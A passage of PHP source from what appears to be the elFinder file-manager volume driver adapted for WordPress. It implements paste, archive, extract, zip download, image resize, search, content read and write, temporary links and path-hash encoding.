        $stat = array('mime' => $mime, 'width' => 0, 'height' => 0, 'size' => $tmpsize);
        if (strpos($mime, 'image') === 0 && ($s = getimagesize($tmpname))) {
            $stat['width'] = $s[0];
            $stat['height'] = $s[1];
        }
        if (($path = $this->saveCE($fp, $dstpath, $name, $stat)) == false) {
            return false;
        }
        $stat = $this->stat($path);
        if (empty($stat['url']) && ($url = $this->getContentUrl($stat['hash']))) {
            $stat['url'] = $url;
        }
        return $stat;
    }

    public function paste($volume, $src, $dst, $rmSrc = false, $hashes = array())
    {
        $err = $rmSrc ? elFinder::ERROR_MOVE : elFinder::ERROR_COPY;
        if ($this->commandDisabled('paste')) {
            return $this->setError($err, '#' . $src, elFinder::ERROR_PERM_DENIED);
        }
        if (($file = $volume->file($src, $rmSrc)) == false) {
            return $this->setError($err, '#' . $src, elFinder::ERROR_FILE_NOT_FOUND);
        }
        $name = $file['name'];
        $errpath = $volume->path($file['hash']);
        if (($dir = $this->dir($dst)) == false) {
            return $this->setError($err, $errpath, elFinder::ERROR_TRGDIR_NOT_FOUND, '#' . $dst);
        }
        if (!$dir['write'] || !$file['read']) {
            return $this->setError($err, $errpath, elFinder::ERROR_PERM_DENIED);
        }
        $destination = $this->decode($dst);
        if (($test = $volume->closest($src, $rmSrc ? 'locked' : 'read', $rmSrc))) {
            return $rmSrc
                ? $this->setError($err, $errpath, elFinder::ERROR_LOCKED, $volume->path($test))
                : $this->setError($err, $errpath, empty($file['thash']) ? elFinder::ERROR_PERM_DENIED : elFinder::ERROR_MKOUTLINK);
        }
        if (isset($hashes[$name])) {
            $test = $this->decode($hashes[$name]);
            $stat = $this->stat($test);
        } else {
            $test = $this->joinPathCE($destination, $name);
            $stat = $this->isNameExists($test);
        }
        $this->clearcache();
        $dstDirExists = false;
        if ($stat && $stat['name'] === $name) {
            if ($this->options['copyOverwrite']) {
                if (!$this->isSameType($file['mime'], $stat['mime'])) {
                    return $this->setError(elFinder::ERROR_NOT_REPLACE, $this->path($stat['hash']));
                }
                if (empty($stat['write'])) {
                    return $this->setError($err, $errpath, elFinder::ERROR_PERM_DENIED);
                }
                if ($this->options['copyJoin']) {
                    if (!empty($stat['locked'])) {
                        return $this->setError(elFinder::ERROR_LOCKED, $this->path($stat['hash']));
                    }
                } else {
                    if (($locked = $this->closestByAttr($test, 'locked', true))) {
                        $stat = $this->stat($locked);
                        return $this->setError(elFinder::ERROR_LOCKED, $this->path($stat['hash']));
                    }
                }
                if ($volume === $this && ((isset($file['target']) && $test == $file['target']) || $test == $this->decode($src))) {
                    return $this->setError(elFinder::ERROR_REPLACE, $errpath);
                }
                if (!$this->options['copyJoin'] || $stat['mime'] !== 'directory') {
                    if (!$this->remove($test)) {
                        return $this->setError(elFinder::ERROR_REPLACE, $this->path($stat['hash']));
                    }
                } else if ($stat['mime'] === 'directory') {
                    $dstDirExists = true;
                }
            } else {
                $name = $this->uniqueName($destination, $name, ' ', false);
            }
        }
        if ($volume === $this) {
            $source = $this->decode($src);
            if ($this->inpathCE($destination, $source)) {
                return $this->setError(elFinder::ERROR_COPY_ITSELF, $errpath);
            }
            $rmDir = false;
            if ($rmSrc) {
                if ($dstDirExists) {
                    $rmDir = true;
                    $method = 'copy';
                } else {
                    $method = 'move';
                }
            } else {
                $method = 'copy';
            }
            $this->clearcache();
            if ($res = ($path = $this->$method($source, $destination, $name)) ? $this->stat($path) : false) {
                if ($rmDir) {
                    $this->remove($source);
                }
            } else {
                return false;
            }
        } else {
            if (!$this->options['copyTo'] || !$volume->copyFromAllowed()) {
                return $this->setError(elFinder::ERROR_COPY, $errpath, elFinder::ERROR_PERM_DENIED);
            }
            $this->error = array();
            if (($path = $this->copyFrom($volume, $src, $destination, $name)) == false) {
                return false;
            }
            if ($rmSrc && !$this->error()) {
                if (!$volume->rm($src)) {
                    if ($volume->file($src)) {
                        $this->addError(elFinder::ERROR_RM_SRC);
                    } else {
                        $this->removed[] = $file;
                    }
                }
            }
            $res = $this->stat($path);
        }
        return $res;
    }
        public function zipdl($hashes)
    {
        if ($this->commandDisabled('zipdl')) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        $archivers = $this->getArchivers();
        $cmd = null;
        if (!$archivers || empty($archivers['create'])) {
            return false;
        }
        $archivers = $archivers['create'];
        if (!$archivers) {
            return false;
        }
        $file = $mime = '';
        foreach (array('zip', 'tgz') as $ext) {
            $mime = $this->mimetype('file.' . $ext, true);
            if (isset($archivers[$mime])) {
                $cmd = $archivers[$mime];
                break;
            }
        }
        if (!$cmd) {
            $cmd = array_shift($archivers);
            if (!empty($ext)) {
                $mime = $this->mimetype('file.' . $ext, true);
            }
        }
        $ext = $cmd['ext'];
        $res = false;
        $mixed = false;
        $hashes = array_values($hashes);
        $dirname = dirname(str_replace($this->separator, DIRECTORY_SEPARATOR, $this->path($hashes[0])));
        $cnt = count($hashes);
        if ($cnt > 1) {
            for ($i = 1; $i < $cnt; $i++) {
                if ($dirname !== dirname(str_replace($this->separator, DIRECTORY_SEPARATOR, $this->path($hashes[$i])))) {
                    $mixed = true;
                    break;
                }
            }
        }
        if ($mixed || $this->root == $this->dirnameCE($this->decode($hashes[0]))) {
            $prefix = $this->rootName;
        } else {
            $prefix = basename($dirname);
        }
        if ($dir = $this->getItemsInHand($hashes)) {
            $tmppre = (substr(PHP_OS, 0, 3) === 'WIN') ? 'zd-' : 'elfzdl-';
            $pdir = dirname($dir);
            register_shutdown_function(array('elFinder', 'GlobGC'), $pdir . DIRECTORY_SEPARATOR . $tmppre . '*', 7200);
            $files = self::localScandir($dir);
            if ($files && ($arc = tempnam($dir, $tmppre))) {
                unlink($arc);
                $arc = $arc . '.' . $ext;
                $name = basename($arc);
                if ($arc = $this->makeArchive($dir, $files, $name, $cmd)) {
                    $file = tempnam($pdir, $tmppre);
                    unlink($file);
                    $res = rename($arc, $file);
                    $this->rmdirRecursive($dir);
                }
            }
        }
        return $res ? array('path' => $file, 'ext' => $ext, 'mime' => $mime, 'prefix' => $prefix) : false;
    }

    public function getContents($hash)
    {
        $file = $this->file($hash);
        if (!$file) {
            return $this->setError(elFinder::ERROR_FILE_NOT_FOUND);
        }
        if ($file['mime'] == 'directory') {
            return $this->setError(elFinder::ERROR_NOT_FILE);
        }
        if (!$file['read']) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if ($this->getMaxSize > 0 && $file['size'] > $this->getMaxSize) {
            return $this->setError(elFinder::ERROR_UPLOAD_FILE_SIZE);
        }
        return $file['size'] ? $this->_getContents($this->convEncIn($this->decode($hash), true)) : '';
    }

    public function putContents($hash, $content)
    {
        if ($this->commandDisabled('edit')) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        $path = $this->decode($hash);
        if (!($file = $this->file($hash))) {
            return $this->setError(elFinder::ERROR_FILE_NOT_FOUND);
        }
        if (!$file['write']) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if (preg_match('~^\0data:(.+?/.+?);base64,~', $content, $m)) {
            $dMime = $m[1];
            if ($file['size'] > 0 && $dMime !== $file['mime']) {
                return $this->setError(elFinder::ERROR_PERM_DENIED);
            }
            $content = base64_decode(substr($content, strlen($m[0])));
        }
        $name = $this->basenameCE($path);
        $mime = '';
        $mimeByName = $this->mimetype($name, true);
        if ($this->mimeDetect !== 'internal') {
            if ($tp = $this->tmpfile()) {
                fwrite($tp, $content);
                $info = stream_get_meta_data($tp);
                $filepath = $info['uri'];
                $mime = $this->mimetype($filepath, $name);
                fclose($tp);
            }
        }
        if (!$this->allowPutMime($mimeByName) || ($mime && !$this->allowPutMime($mime))) {
            return $this->setError(elFinder::ERROR_UPLOAD_FILE_MIME);
        }
        $this->clearcache();
        $res = false;
        if ($this->convEncOut($this->_filePutContents($this->convEncIn($path), $content))) {
            $this->rmTmb($file);
            $this->clearstatcache();
            $res = $this->stat($path);
        }
        return $res;
    }

    public function extract($hash, $makedir = null)
    {
        if ($this->commandDisabled('extract')) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if (($file = $this->file($hash)) == false) {
            return $this->setError(elFinder::ERROR_FILE_NOT_FOUND);
        }
        $archiver = isset($this->archivers['extract'][$file['mime']])
            ? $this->archivers['extract'][$file['mime']]
            : array();
        if (!$archiver) {
            return $this->setError(elFinder::ERROR_NOT_ARCHIVE);
        }
        $path = $this->decode($hash);
        $parent = $this->stat($this->dirnameCE($path));
        if (!$file['read'] || !$parent['write']) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        $this->clearcache();
        $this->extractToNewdir = is_null($makedir) ? 'auto' : (bool)$makedir;
        if ($path = $this->convEncOut($this->_extract($this->convEncIn($path), $archiver))) {
            if (is_array($path)) {
                foreach ($path as $_k => $_p) {
                    $path[$_k] = $this->stat($_p);
                }
            } else {
                $path = $this->stat($path);
            }
            return $path;
        } else {
            return false;
        }
    }

    public function archive($hashes, $mime, $name = '')
    {
        if ($this->commandDisabled('archive')) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if ($name !== '' && !$this->nameAccepted($name, false)) {
            return $this->setError(elFinder::ERROR_INVALID_NAME);
        }
        $archiver = isset($this->archivers['create'][$mime])
            ? $this->archivers['create'][$mime]
            : array();
        if (!$archiver) {
            return $this->setError(elFinder::ERROR_ARCHIVE_TYPE);
        }
        $files = array();
        $useRemoteArchive = !empty($this->options['useRemoteArchive']);
        $dir = '';
        foreach ($hashes as $hash) {
            if (($file = $this->file($hash)) == false) {
                return $this->setError(elFinder::ERROR_FILE_NOT_FOUND, '#' . $hash);
            }
            if (!$file['read']) {
                return $this->setError(elFinder::ERROR_PERM_DENIED);
            }
            $path = $this->decode($hash);
            if ($dir === '') {
                $dir = $this->dirnameCE($path);
                $stat = $this->stat($dir);
                if (!$stat['write']) {
                    return $this->setError(elFinder::ERROR_PERM_DENIED);
                }
            }
            $files[] = $useRemoteArchive ? $hash : $this->basenameCE($path);
        }
        if ($name === '') {
            $name = count($files) == 1 ? $files[0] : 'Archive';
        } else {
            $name = str_replace(array('/', '\\'), '_', preg_replace('/\.' . preg_quote($archiver['ext'], '/') . '$/i', '', $name));
        }
        $name .= '.' . $archiver['ext'];
        $name = $this->uniqueName($dir, $name, '');
        $this->clearcache();
        if ($useRemoteArchive) {
            return ($path = $this->remoteArchive($files, $name, $archiver)) ? $this->stat($path) : false;
        } else {
            return ($path = $this->convEncOut($this->_archive($this->convEncIn($dir), $this->convEncIn($files), $this->convEncIn($name), $archiver))) ? $this->stat($path) : false;
        }
    }

    protected function remoteArchive($hashes, $name, $arc)
    {
        $resPath = false;
        $file0 = $this->file($hashes[0]);
        if ($file0 && ($dir = $this->getItemsInHand($hashes))) {
            $files = self::localScandir($dir);
            if ($files) {
                if ($arc = $this->makeArchive($dir, $files, $name, $arc)) {
                    if ($fp = fopen($arc, 'rb')) {
                        $fstat = stat($arc);
                        $stat = array(
                            'size' => $fstat['size'],
                            'ts' => $fstat['mtime'],
                            'mime' => $this->mimetype($arc, $name)
                        );
                        $path = $this->decode($file0['phash']);
                        $resPath = $this->saveCE($fp, $path, $name, $stat);
                        fclose($fp);
                    }
                }
            }
            $this->rmdirRecursive($dir);
        }
        return $resPath;
    }

    public function resize($hash, $width, $height, $x, $y, $mode = 'resize', $bg = '', $degree = 0, $jpgQuality = null)
    {
        if ($this->commandDisabled('resize')) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if ($mode === 'rotate' && $degree == 0) {
            return array('losslessRotate' => ($this->procExec(ELFINDER_EXIFTRAN_PATH . ' -h') === 0 || $this->procExec(ELFINDER_JPEGTRAN_PATH . ' -version') === 0));
        }
        if (($file = $this->file($hash)) == false) {
            return $this->setError(elFinder::ERROR_FILE_NOT_FOUND);
        }
        if (!$file['write'] || !$file['read']) {
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        $path = $this->decode($hash);
        $work_path = $this->getWorkFile($this->encoding ? $this->convEncIn($path, true) : $path);
        if (!$work_path || !is_writable($work_path)) {
            if ($work_path && $path !== $work_path && is_file($work_path)) {
                unlink($work_path);
            }
            return $this->setError(elFinder::ERROR_PERM_DENIED);
        }
        if ($this->imgLib !== 'imagick' && $this->imgLib !== 'convert') {
            if (elFinder::isAnimationGif($work_path)) {
                return $this->setError(elFinder::ERROR_UNSUPPORT_TYPE);
            }
        }
        if (elFinder::isAnimationPng($work_path)) {
            return $this->setError(elFinder::ERROR_UNSUPPORT_TYPE);
        }
        switch ($mode) {
            case 'propresize':
                $result = $this->imgResize($work_path, $width, $height, true, true, null, $jpgQuality);
                break;
            case 'crop':
                $result = $this->imgCrop($work_path, $width, $height, $x, $y, null, $jpgQuality);
                break;
            case 'fitsquare':
                $result = $this->imgSquareFit($work_path, $width, $height, 'center', 'middle', ($bg ? $bg : $this->options['tmbBgColor']), null, $jpgQuality);
                break;
            case 'rotate':
                $result = $this->imgRotate($work_path, $degree, ($bg ? $bg : $this->options['bgColorFb']), null, $jpgQuality);
                break;
            default:
                $result = $this->imgResize($work_path, $width, $height, false, true, null, $jpgQuality);
                break;
        }
        $ret = false;
        if ($result) {
            $this->rmTmb($file);
            $this->clearstatcache();
            $fstat = stat($work_path);
            $imgsize = getimagesize($work_path);
            if ($path !== $work_path) {
                $file['size'] = $fstat['size'];
                $file['ts'] = $fstat['mtime'];
                if ($imgsize) {
                    $file['width'] = $imgsize[0];
                    $file['height'] = $imgsize[1];
                }
                if ($fp = fopen($work_path, 'rb')) {
                    $ret = $this->saveCE($fp, $this->dirnameCE($path), $this->basenameCE($path), $file);
                    fclose($fp);
                }
            } else {
                $ret = true;
            }
            if ($ret) {
                $this->clearcache();
                $ret = $this->stat($path);
                if ($imgsize) {
                    $ret['width'] = $imgsize[0];
                    $ret['height'] = $imgsize[1];
                }
            }
        }
        if ($path !== $work_path) {
            is_file($work_path) && unlink($work_path);
        }
        return $ret;
    }

    public function rm($hash)
    {
        return $this->commandDisabled('rm')
            ? $this->setError(elFinder::ERROR_PERM_DENIED)
            : $this->remove($this->decode($hash));
    }

    public function search($q, $mimes, $hash = null)
    {
        $res = array();
        $matchMethod = null;
        $args = func_get_args();
        if (!empty($args[3])) {
            $matchMethod = 'searchMatch' . $args[3];
            if (!is_callable(array($this, $matchMethod))) {
                return array();
            }
        }
        $dir = null;
        if ($hash) {
            $dir = $this->decode($hash);
            $stat = $this->stat($dir);
            if (!$stat || $stat['mime'] !== 'directory' || !$stat['read']) {
                $q = '';
            }
        }
        if ($mimes && $this->onlyMimes) {
            $mimes = array_intersect($mimes, $this->onlyMimes);
            if (!$mimes) {
                $q = '';
            }
        }
        $this->searchStart = time();
        $qs = preg_split('/"([^"]+)"| +/', $q, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE);
        $query = $excludes = array();
        foreach ($qs as $_q) {
            $_q = trim($_q);
            if ($_q !== '') {
                if ($_q[0] === '-') {
                    if (isset($_q[1])) {
                        $excludes[] = substr($_q, 1);
                    }
                } else {
                    $query[] = $_q;
                }
            }
        }
        if (!$query) {
            $q = '';
        } else {
            $q = join(' ', $query);
            $this->doSearchCurrentQuery = array(
                'q' => $q,
                'excludes' => $excludes,
                'matchMethod' => $matchMethod
            );
        }
        if ($q === '' || $this->commandDisabled('search')) {
            return $res;
        }
        if ($this->options['searchExDirReg']) {
            if (false === preg_match($this->options['searchExDirReg'], '')) {
                $this->options['searchExDirReg'] = '';
            }
        }
        if (!$mimes && (is_null($dir) || $dir == $this->root)) {
            $rootStat = $this->stat($this->root);
            if (!empty($rootStat['phash'])) {
                if ($this->stripos($rootStat['name'], $q) !== false) {
                    $res = array($rootStat);
                }
            }
        }
        return array_merge($res, $this->doSearch(is_null($dir) ? $this->root : $dir, $q, $mimes));
    }

    public function dimensions($hash)
    {
        if (($file = $this->file($hash)) == false) {
            return false;
        }
        if (func_num_args() > 1) {
            $args = func_get_arg(1);
        } else {
            $args = array();
        }
        return $this->convEncOut($this->_dimensions($this->convEncIn($this->decode($hash)), $file['mime'], $args));
    }

    public function subdirs($hash)
    {
        return (bool)$this->subdirsCE($this->decode($hash));
    }

    public function getContentUrl($hash, $options = array())
    {
        if (($file = $this->file($hash)) === false) {
            return false;
        }
        if (!empty($options['onetime']) && $this->options['onetimeUrl']) {
            if (is_callable($this->options['onetimeUrl'])) {
                return call_user_func_array($this->options['onetimeUrl'], array($file, $options, $this));
            } else {
                $ret = false;
                if ($tmpdir = elFinder::getStaticVar('commonTempPath')) {
                    if ($source = $this->open($hash)) {
                        if ($_dat = tempnam($tmpdir, 'ELF')) {
                            $token = md5($_dat . session_id());
                            $dat = $tmpdir . DIRECTORY_SEPARATOR . 'ELF' . $token;
                            if (rename($_dat, $dat)) {
                                $info = stream_get_meta_data($source);
                                if (!empty($info['uri'])) {
                                    $tmp = $info['uri'];
                                } else {
                                    $tmp = tempnam($tmpdir, 'ELF');
                                    if ($dest = fopen($tmp, 'wb')) {
                                        if (!stream_copy_to_stream($source, $dest)) {
                                            $tmp = false;
                                        }
                                        fclose($dest);
                                    }
                                }
                                $this->close($source, $hash);
                                if ($tmp) {
                                    $info = array(
                                        'file' => base64_encode($tmp),
                                        'name' => $file['name'],
                                        'mime' => $file['mime'],
                                        'ts' => $file['ts']
                                    );
                                    if (file_put_contents($dat, json_encode($info))) {
                                        $conUrl = elFinder::getConnectorUrl();
                                        $ret = $conUrl . (strpos($conUrl, '?') !== false? '&' : '?') . 'cmd=file&onetime=1&target=' . $token;
                                    }
                                }
                                if (!$ret) {
                                    unlink($dat);
                                }
                            } else {
                                unlink($_dat);
                            }
                        }
                    }
                }
                return $ret;
            }
        }
        if (empty($file['url']) && $this->URL) {
            $path = str_replace($this->separator, '/', substr($this->decode($hash), strlen(rtrim($this->root, '/' . $this->separator)) + 1));
            if ($this->encoding) {
                $path = $this->convEncIn($path, true);
            }
            $path = str_replace('%2F', '/', rawurlencode($path));
            return $this->URL . $path;
        } else {
            $ret = false;
            if (!empty($file['url']) && $file['url'] != 1) {
                return $file['url'];
            } else if (!empty($options['temporary']) && ($tempInfo = $this->getTempLinkInfo('temp_' . md5($hash . session_id())))) {
                if (is_readable($tempInfo['path'])) {
                    touch($tempInfo['path']);
                    $ret = $tempInfo['url'] . '?' . rawurlencode($file['name']);
                } else if ($source = $this->open($hash)) {
                    if ($dest = fopen($tempInfo['path'], 'wb')) {
                        if (stream_copy_to_stream($source, $dest)) {
                            $ret = $tempInfo['url'] . '?' . rawurlencode($file['name']);
                        }
                        fclose($dest);
                    }
                    $this->close($source, $hash);
                }
            }
            return $ret;
        }
    }

    public function getTempLinkInfo($name = null)
    {
        if ($this->tmpLinkPath) {
            if (!$name) {
                $name = 'temp_' . md5($_SERVER['REMOTE_ADDR'] . (string)microtime(true));
            } else if (substr($name, 0, 5) !== 'temp_') {
                $name = 'temp_' . $name;
            }
            register_shutdown_function(array('elFinder', 'GlobGC'), $this->tmpLinkPath . DIRECTORY_SEPARATOR . 'temp_*', elFinder::$tmpLinkLifeTime);
            return array(
                'path' => $path = $this->tmpLinkPath . DIRECTORY_SEPARATOR . $name,
                'url' => $this->tmpLinkUrl . '/' . rawurlencode($name)
            );
        }
        return false;
    }

    public function getSubstituteImgLink($target, $srcSize, $srcfp = null, $maxSize = null)
    {
        $url = false;
        $file = $this->file($target);
        $force = !in_array($file['mime'], array('image/jpeg', 'image/png', 'image/gif'));
        if (!$maxSize) {
            $args = elFinder::$currentArgs;
            if (!empty($args['substitute'])) {
                $maxSize = $args['substitute'];
            }
        }
        if ($maxSize && $srcSize[0] && $srcSize[1]) {
            if ($this->getOption('substituteImg')) {
                $maxSize = intval($maxSize);
                $zoom = min(($maxSize / $srcSize[0]), ($maxSize / $srcSize[1]));
                if ($force || $zoom < 1) {
                    $width = round($srcSize[0] * $zoom);
                    $height = round($srcSize[1] * $zoom);
                    $jpgQuality = 50;
                    $preserveExif = false;
                    $unenlarge = true;
                    $checkAnimated = true;
                    $destformat = $file['mime'] === 'image/jpeg'? null : 'png';
                    if (!$srcfp) {
                        elFinder::checkAborted();
                        $srcfp = $this->open($target);
                    }
                    if ($srcfp && ($tempLink = $this->getTempLinkInfo())) {
                        elFinder::checkAborted();
                        $dest = fopen($tempLink['path'], 'wb');
                        if ($dest && stream_copy_to_stream($srcfp, $dest)) {
                            fclose($dest);
                            if ($this->imageUtil('resize', $tempLink['path'], compact('width', 'height', 'jpgQuality', 'preserveExif', 'unenlarge', 'checkAnimated', 'destformat'))) {
                                $url = $tempLink['url'];
                                touch($tempLink['path'], time() - elFinder::$tmpLinkLifeTime + 60);
                            } else {
                                unlink($tempLink['path']);
                            }
                        }
                        $this->close($srcfp, $target);
                    }
                }
            }
        }
        return $url;
    }

    public function getTempPath()
    {
        $tempPath = null;
        if (isset($this->tmpPath) && $this->tmpPath && is_writable($this->tmpPath)) {
            $tempPath = $this->tmpPath;
        } else if (isset($this->tmp) && $this->tmp && is_writable($this->tmp)) {
            $tempPath = $this->tmp;
        } else if (elFinder::getStaticVar('commonTempPath') && is_writable(elFinder::getStaticVar('commonTempPath'))) {
            $tempPath = elFinder::getStaticVar('commonTempPath');
        } else if (function_exists('sys_get_temp_dir')) {
            $tempPath = sys_get_temp_dir();
        } else if ($this->tmbPathWritable) {
            $tempPath = $this->tmbPath;
        }
        if ($tempPath && DIRECTORY_SEPARATOR !== '/') {
            $tempPath = str_replace('/', DIRECTORY_SEPARATOR, $tempPath);
        }
        if(opendir($tempPath)){
            return $tempPath;
        } else if (defined( 'WP_TEMP_DIR' )) {
            return get_temp_dir();
        } else {
            $custom_temp_path = WP_CONTENT_DIR.'/temp';
            if (!is_dir($custom_temp_path)) {
                mkdir($custom_temp_path, 0777, true);
            }
            return $custom_temp_path;
        }
    }

    public function getUploadTaget($baseTargetHash, $path, & $result)
    {
        $base = $this->decode($baseTargetHash);
        $targetHash = $baseTargetHash;
        $path = ltrim($path, $this->separator);
        $dirs = explode($this->separator, $path);
        array_pop($dirs);
        foreach ($dirs as $dir) {
            $targetPath = $this->joinPathCE($base, $dir);
            if (!$_realpath = $this->realpath($this->encode($targetPath))) {
                if ($stat = $this->mkdir($targetHash, $dir)) {
                    $result['added'][] = $stat;
                    $targetHash = $stat['hash'];
                    $base = $this->decode($targetHash);
                } else {
                    return false;
                }
            } else {
                $targetHash = $this->encode($_realpath);
                if ($this->dir($targetHash)) {
                    $base = $this->decode($targetHash);
                } else {
                    return false;
                }
            }
        }
        return $targetHash;
    }

    public function getUploadMaxSize() { return $this->uploadMaxSize; }
    public function setUploadOverwrite($var) { $this->uploadOverwrite = (bool)$var; }

    public function imageUtil($mode, $src, $options = array())
    {
        if (!isset($options['jpgQuality'])) {
            $options['jpgQuality'] = intval($this->options['jpgQuality']);
        }
        if (!isset($options['bgcolor'])) {
            $options['bgcolor'] = '#ffffff';
        }
        if (!isset($options['bgColorFb'])) {
            $options['bgColorFb'] = $this->options['bgColorFb'];
        }
        $destformat = !empty($options['destformat'])? $options['destformat'] : null;
        if (in_array($mode, array('resize', 'propresize', 'crop', 'fitsquare'))) {
            if (empty($options['width']) || empty($options['height'])) {
                return false;
            }
        }
        if (!empty($options['checkAnimated'])) {
            if ($this->imgLib !== 'imagick' && $this->imgLib !== 'convert') {
                if (elFinder::isAnimationGif($src)) {
                    return false;
                }
            }
            if (elFinder::isAnimationPng($src)) {
                return false;
            }
        }
        switch ($mode) {
            case 'rotate':
                if (empty($options['degree'])) {
                    return true;
                }
                return (bool)$this->imgRotate($src, $options['degree'], $options['bgColorFb'], $destformat, $options['jpgQuality']);
            case 'resize':
                return (bool)$this->imgResize($src, $options['width'], $options['height'], false, true, $destformat, $options['jpgQuality'], $options);
            case 'propresize':
                return (bool)$this->imgResize($src, $options['width'], $options['height'], true, true, $destformat, $options['jpgQuality'], $options);
            case 'crop':
                if (isset($options['x']) && isset($options['y'])) {
                    return (bool)$this->imgCrop($src, $options['width'], $options['height'], $options['x'], $options['y'], $destformat, $options['jpgQuality']);
                }
                break;
            case 'fitsquare':
                return (bool)$this->imgSquareFit($src, $options['width'], $options['height'], 'center', 'middle', $options['bgcolor'], $destformat, $options['jpgQuality']);
        }
        return false;
    }

    public function ffmpegToImg($file, $stat, $self, $ss = null)
    {
        $name = basename($file);
        $path = dirname($file);
        $tmp = $path . DIRECTORY_SEPARATOR . md5($name);
        $GLOBALS['elFinderTempFiles'][$tmp] = true;
        if (rename($file, $tmp)) {
            if ($ss === null) {
                if (preg_match('/\^(\d+(?:\.\d+)?)\.[^.]+$/', $stat['name'], $_m)) {
                    $ss = $_m[1];
                } else {
                    $ss = $this->options['tmbVideoConvSec'];
                }
            }
            $cmd = sprintf(ELFINDER_FFMPEG_PATH . ' -i %s -ss 00:00:%.3f -vframes 1 -f image2 -- %s', escapeshellarg($tmp), $ss, escapeshellarg($file));
            $r = ($this->procExec($cmd) === 0);
            clearstatcache();
            if ($r && $ss > 0 && !file_exists($file)) {
                $ss = max(intval($ss / 2), 0);
                rename($tmp, $file);
                $r = $this->ffmpegToImg($file, $stat, $self, $ss);
            } else {
                unlink($tmp);
            }
            return $r;
        }
        return false;
    }

    public function tmpfile()
    {
        if ($tmp = $this->getTempFile()) {
            return fopen($tmp, 'wb');
        }
        return false;
    }

    protected function setError()
    {
        $this->error = array();
        $this->addError(func_get_args());
        return false;
    }

    protected function addError()
    {
        foreach (func_get_args() as $err) {
            if (is_array($err)) {
                foreach($err as $er) {
                    $this->addError($er);
                }
            } else {
                $this->error[] = (string)$err;
            }
        }
        return false;
    }

    protected function dirnameCE($path)
    {
        $dirname = (!$this->encoding) ? $this->_dirname($path) : $this->convEncOut($this->_dirname($this->convEncIn($path)));
        return ($dirname != $path) ? $dirname : '';
    }

    protected function basenameCE($path)
    {
        return (!$this->encoding) ? $this->_basename($path) : $this->convEncOut($this->_basename($this->convEncIn($path)));
    }

    protected function joinPathCE($dir, $name)
    {
        return (!$this->encoding) ? $this->_joinPath($dir, $name) : $this->convEncOut($this->_joinPath($this->convEncIn($dir), $this->convEncIn($name)));
    }

    protected function normpathCE($path)
    {
        return (!$this->encoding) ? $this->_normpath($path) : $this->convEncOut($this->_normpath($this->convEncIn($path)));
    }

    protected function relpathCE($path)
    {
        return (!$this->encoding) ? $this->_relpath($path) : $this->convEncOut($this->_relpath($this->convEncIn($path)));
    }

    protected function abspathCE($path)
    {
        return (!$this->encoding) ? $this->_abspath($path) : $this->convEncOut($this->_abspath($this->convEncIn($path)));
    }

    protected function inpathCE($path, $parent)
    {
        return (!$this->encoding) ? $this->_inpath($path, $parent) : $this->convEncOut($this->_inpath($this->convEncIn($path), $this->convEncIn($parent)));
    }

    protected function fopenCE($path, $mode = 'rb')
    {
        if (func_num_args() > 2) {
            $opts = func_get_arg(2);
        } else {
            $opts = array();
        }
        return (!$this->encoding) ? $this->_fopen($path, $mode, $opts) : $this->convEncOut($this->_fopen($this->convEncIn($path), $mode, $opts));
    }

    protected function fcloseCE($fp, $path = '')
    {
        return (!$this->encoding) ? $this->_fclose($fp, $path) : $this->convEncOut($this->_fclose($fp, $this->convEncIn($path)));
    }

    protected function saveCE($fp, $dir, $name, $stat)
    {
        $res = (!$this->encoding) ? $this->_save($fp, $dir, $name, $stat) : $this->convEncOut($this->_save($fp, $this->convEncIn($dir), $this->convEncIn($name), $this->convEncIn($stat)));
        if ($res !== false) {
            $this->clearstatcache();
        }
        return $res;
    }

    protected function subdirsCE($path)
    {
        if ($this->sessionCaching['subdirs']) {
            if (isset($this->sessionCache['subdirs'][$path]) && !$this->isMyReload()) {
                return $this->sessionCache['subdirs'][$path];
            }
        }
        $hasdir = (bool)((!$this->encoding) ? $this->_subdirs($path) : $this->convEncOut($this->_subdirs($this->convEncIn($path))));
        $this->updateSubdirsCache($path, $hasdir);
        return $hasdir;
    }

    protected function scandirCE($path)
    {
        return (!$this->encoding) ? $this->_scandir($path) : $this->convEncOut($this->_scandir($this->convEncIn($path)));
    }

    protected function symlinkCE($source, $targetDir, $name)
    {
        return (!$this->encoding) ? $this->_symlink($source, $targetDir, $name) : $this->convEncOut($this->_symlink($this->convEncIn($source), $this->convEncIn($targetDir), $this->convEncIn($name)));
    }

    protected function encode($path)
    {
        if ($path !== '') {
            $p = $this->relpathCE($path);
            if ($p === '') {
                $p = $this->separator;
            }
            if ($this->separatorForHash) {
                $p = str_replace($this->separator, $this->separatorForHash, $p);
            }
            $hash = $this->crypt($p);
            $hash = strtr(base64_encode($hash), '+/=', '-_.');
            $hash = rtrim($hash, '.');
            return $this->id . $hash;
        }
    }

    protected function decode($hash)
    {
        if (strpos($hash, $this->id) === 0) {
            $h = substr($hash, strlen($this->id));
            $h = base64_decode(strtr($h, '-_.', '+/='));
            $path = $this->uncrypt($h);
            if ($this->separatorForHash) {
                $path = str_replace($this->separatorForHash, $this->separator, $path);
            }
            return $this->abspathCE($path);
        }
        return '';
    }

    protected function crypt($path) { return $path; }
    protected function uncrypt($hash) { return $hash; }

    protected function nameAccepted($name, $isDir = false)
    {
        if (json_encode($name) === false) {
            return false;
        }
        $nameValidator = $isDir ? $this->dirnameValidator : $this->nameValidator;
        if ($nameValidator) {
            if (is_callable($nameValidator)) {
                $res = call_user_func($nameValidator, $name);
                return $res;
            }
            if (preg_match($nameValidator, '') !== false) {
                return preg_match($nameValidator, $name);
            }
        }
        return true;
    }

    protected function getRootstatCachekey()
    {
        return md5($this->root . (isset($this->options['alias']) ? $this->options['alias'] : ''));
    }

    public function uniqueName($dir, $name, $suffix = ' copy', $checkNum = true, $start = 1)
    {
        static $lasts = null;
        if ($lasts === null) {
            $lasts = array();
        }
        $ext = '';
        $splits = elFinder::splitFileExtention($name);
        if ($splits[1]) {
            $ext = '.' . $splits[1];
            $name = $splits[0];
        }
